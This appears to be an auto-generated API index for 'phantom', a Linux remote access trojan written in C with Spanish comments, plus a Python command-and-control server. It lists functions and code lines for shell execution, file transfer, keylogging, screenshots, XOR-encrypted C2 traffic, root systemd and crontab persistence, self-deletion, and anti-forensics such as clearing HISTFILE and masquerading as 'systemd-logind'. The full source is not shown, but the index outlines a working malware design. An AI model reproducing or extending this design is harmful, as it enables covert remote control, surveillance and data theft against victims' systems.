# API

## phantom.c

### __io_uring_setup (function) `static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p)`
- Defined: `phantom.c:68`

### __io_uring_enter (function) `static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
   ...`
- Defined: `phantom.c:72`

### __io_uring_register (function) `static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int ...`
- Defined: `phantom.c:76`

### uring_queue_init (function) `static int uring_queue_init(unsigned int entries, struct io_uring *ring)`
- Defined: `phantom.c:79`

### uring_get_sqe (function) `static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring)`
- Defined: `phantom.c:119`

### uring_submit (function) `static int uring_submit(struct io_uring *ring)`
- Defined: `phantom.c:127`

### uring_wait_cqe_timeout (function) `static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeo...`
- Defined: `phantom.c:133`

### uring_cqe_seen (function) `static inline void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)`
- Defined: `phantom.c:142`

### chacha20_keystream (function) `static void chacha20_keystream(uint32_t counter, uint8_t *key, uint8_t *nonce, uint8_t *out, size...`
- Defined: `phantom.c:154`

### encrypt_payload (function) `static void encrypt_payload(uint8_t *data, size_t len, uint8_t *key, uint8_t *nonce)`
- Defined: `phantom.c:160`

### uring_read (function) `static ssize_t uring_read(int fd, void *buf, size_t count, off_t offset)`
- Defined: `phantom.c:220`

### uring_write (function) `static ssize_t uring_write(int fd, const void *buf, size_t count, off_t offset)`
- Defined: `phantom.c:242`

### run_shell_command (function) `static char *run_shell_command(const char *cmd)`
- Defined: `phantom.c:268`
- Doc: --------------------------------------------------------------------- EJECUCIÓN DE COMANDOS ----------------------------

### upload_file (function) `static int upload_file(const char *local_path, const char *remote_path)`
- Defined: `phantom.c:303`
- Doc: --------------------------------------------------------------------- SUBIR / BAJAR ARCHIVOS ---------------------------

### download_file (function) `static int download_file(const char *remote_path, const char *local_path)`
- Defined: `phantom.c:318`

### install_persistence (function) `static void install_persistence(void)`
- Defined: `phantom.c:326`
- Doc: --------------------------------------------------------------------- PERSISTENCIA -------------------------------------

### take_screenshot (function) `static void take_screenshot(const char *outfile)`
- Defined: `phantom.c:400`
- Doc: --------------------------------------------------------------------- CAPTURA DE PANTALLA ------------------------------

### connect_c2 (function) `static int connect_c2(void)`
- Defined: `phantom.c:409`
- Doc: --------------------------------------------------------------------- C2 COMUNICACIÓN ----------------------------------

### recv_encrypted (function) `static int recv_encrypted(int sock, void *buf, size_t len, unsigned char *key)`
- Defined: `phantom.c:423`

### send_encrypted (function) `static int send_encrypted(int sock, const void *buf, size_t len, unsigned char *key)`
- Defined: `phantom.c:430`

### recv_command (function) `static c2_command_t recv_command(int sock)`
- Defined: `phantom.c:440`

### send_response (function) `static void send_response(int sock, c2_response_t *resp)`
- Defined: `phantom.c:452`

### process_command (function) `static void process_command(int sock, c2_command_t *cmd)`
- Defined: `phantom.c:462`
- Doc: --------------------------------------------------------------------- PROCESADOR DE COMANDOS ---------------------------

### c2_loop (function) `static void *c2_loop(void *arg)`
- Defined: `phantom.c:563`
- Doc: --------------------------------------------------------------------- HILO PRINCIPAL C2 --------------------------------

### anti_forensics (function) `static void anti_forensics(void)`
- Defined: `phantom.c:600`
- Doc: --------------------------------------------------------------------- ANTI‑FORENSE -------------------------------------

### main (function) `int main(int argc, char **argv)`
- Defined: `phantom.c:611`
- Doc: --------------------------------------------------------------------- MAIN ---------------------------------------------

### syscall (function) `return syscall(__NR_io_uring_setup, entries, p);`
- Defined: `phantom.c:70`

### memset (function) `memset(sqe, 0, sizeof(*sqe));`
- Defined: `phantom.c:124`

### srand (function) `srand((unsigned)(counter + time(NULL) ^ (uintptr_t)key));`
- Defined: `phantom.c:156`

### pthread_mutex_lock (function) `pthread_mutex_lock(&g_ring_mutex);`
- Defined: `phantom.c:204`

### pthread_mutex_unlock (function) `pthread_mutex_unlock(&g_ring_mutex);`
- Defined: `phantom.c:217`

### dup2 (function) `dup2(pipefd[1], STDOUT_FILENO);`
- Defined: `phantom.c:276`

### close (function) `close(pipefd[0]);`
- Defined: `phantom.c:278`

### execl (function) `execl("/bin/sh", "sh", "-c", cmd, NULL);`
- Defined: `phantom.c:280`

### exit (function) `exit(1);`
- Defined: `phantom.c:281`

### memcpy (function) `memcpy(output + total, buf, n);`
- Defined: `phantom.c:290`

### waitpid (function) `waitpid(pid, NULL, 0);`
- Defined: `phantom.c:295`

### fchmod (function) `fchmod(dst, 0644);`
- Defined: `phantom.c:309`
- Doc: Ajustar permisos a 0644 (si falla, no importa)

### snprintf (function) `snprintf(svc_path, sizeof(svc_path), "/etc/systemd/system/phantom.service");`
- Defined: `phantom.c:333`

### fprintf (function) `fprintf(f, "[Unit]\nDescription=Phantom Service\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n", self_path);`
- Defined: `phantom.c:336`

### fclose (function) `fclose(f);`
- Defined: `phantom.c:337`

### system (function) `system(crontab_cmd);`
- Defined: `phantom.c:343`

### closedir (function) `closedir(d);`
- Defined: `phantom.c:366`

### fflush (function) `fflush(log);`
- Defined: `phantom.c:387`

### usleep (function) `usleep(10000);`
- Defined: `phantom.c:390`

### inet_pton (function) `inet_pton(AF_INET, g_c2_server, &addr.sin_addr);`
- Defined: `phantom.c:416`

### xor_crypt (function) `xor_crypt((unsigned char*)buf, n, key, strlen((char*)key));`
- Defined: `phantom.c:427`

### free (function) `free(tmp);`
- Defined: `phantom.c:437`

### strcpy (function) `strcpy(cmd.cmd_type, "none");`
- Defined: `phantom.c:446`

### pthread_create (function) `pthread_create(&g_keylog_thread, NULL, keylog_thread, NULL);`
- Defined: `phantom.c:514`

### pthread_detach (function) `pthread_detach(g_keylog_thread);`
- Defined: `phantom.c:515`

### readlink (function) `readlink("/proc/self/exe", self, sizeof(self)-1);`
- Defined: `phantom.c:542`

### unlink (function) `unlink(self);`
- Defined: `phantom.c:543`

### sleep (function) `sleep(delay);`
- Defined: `phantom.c:571`

### FD_ZERO (function) `FD_ZERO(&fds);`
- Defined: `phantom.c:581`

### FD_SET (function) `FD_SET(sock, &fds);`
- Defined: `phantom.c:582`

### unsetenv (function) `unsetenv("HISTFILE");`
- Defined: `phantom.c:601`

### setrlimit (function) `setrlimit(RLIMIT_CORE, &rl);`
- Defined: `phantom.c:604`

### prctl (function) `prctl(PR_SET_NAME, "systemd-logind", 0, 0, 0);`
- Defined: `phantom.c:605`

### strncpy (function) `strncpy(g_c2_server, argv[++i], sizeof(g_c2_server)-1);`
- Defined: `phantom.c:614`

## server.py

### xor_crypt (function) `def xor_crypt(data)`
- Defined: `server.py:11`
- Doc: Aplica XOR con la clave definida

### recv_exact (function) `def recv_exact(sock, n)`
- Defined: `server.py:15`
- Doc: Recibe exactamente n bytes

### main (function) `def main()`
- Defined: `server.py:25`
